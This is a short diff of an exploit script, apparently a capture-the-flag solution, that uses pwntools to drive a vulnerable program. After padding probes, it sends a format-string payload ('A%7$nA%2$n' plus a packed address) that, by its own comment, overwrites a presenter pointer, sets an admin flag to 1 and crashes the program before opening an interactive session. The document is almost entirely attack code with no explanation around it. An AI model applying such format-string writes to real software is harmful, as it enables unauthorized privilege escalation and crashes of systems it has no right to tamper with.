@@ -8,12 +8,12 @@ else:
 for i in range(37, 129):
     p.recvuntil(': ')
     p.send('A'*i)
-    out = p.recvline()[:-1]
-    if i == 128:
-        print(out.split(' ')[-5:-1])
+    p.recvline()
 
 
 p.recvuntil(': ')
+# set global_state.presenter to our input, and using 
+# format string, set global_state.admin=1 and also crash the program
 p.send('A%7$nA%2$n'.ljust(128, 'A')+p32(0x00098c9c+4))
 p.interactive()
     
